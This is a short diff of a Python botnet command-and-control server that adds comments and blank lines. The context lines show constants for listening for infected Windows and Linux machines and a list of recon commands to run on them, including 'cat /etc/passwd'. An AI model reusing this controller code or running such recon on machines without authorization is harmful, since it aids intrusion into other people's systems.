@@ -24,7 +24,6 @@ except ImportError as err:
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 #  CONSTANTS   #
-
 PORT = 1337 # Port number to receve connections from.
 IP = "192.168.31.134" # IP address of your computer. Change this!
 NUM_OF_CONNECTIONS = 10 # Number of connections to accept.
@@ -43,6 +42,7 @@ LINUX_CONNS = {} # Dict containing Linux machines IP addresses and corresponding
 WINDOWS_COUNT = 0 # Count for the number of Windows machines connected to our botnet.
 LINUX_COUNT = 0 # Count for the number of Linux machines connected to our botnet.
 IP_ADDRESSES = [[],[]] # A list containing the IP addresses of both Lin/Win machines. Seperate lists.
+
 # A list containing the commands to gather general recon info for linux machines.
 AUTO_RECON_CMDS_LINUX = ['cat /etc/passwd', 'cat /etc/group', 'ps aux', 'df', 'top -b -n 1']
 # A list containing the commands to gather general recon info for windows machines.
@@ -81,6 +81,7 @@ class Server:
 	def accept_connections(self):
 		"""
 		"""
+		# To modify and altar global variables:
 		global LINUX_CONNS
 		global LINUX_COUNT
 		global WINDOWS_CONNS
@@ -124,6 +125,7 @@ class BotnetCmdCtrl:
 		self.server_queue = Queue() # Will be used to perform next job in the queue.
 		self.output_to_file = False # Will switch mode from only stdout to stdout and file stream.
 		self.threads = [] # Will store the two threads created.
+		# To modify and altar global variables:
 		global LINUX_COUNT
 		global LINUX_CONNS
 		global WINDOWS_COUNT
@@ -476,7 +478,7 @@ def main():
 	botnetObj.start() # Initiate the program.
 
 if __name__ == '__main__':
-	server = Server()
+	server = Server() # Will be used here to close all socket connections before exiting program.
 	try:
 		main()
 	except KeyboardInterrupt: # Handling KeyboardInterrupt error.
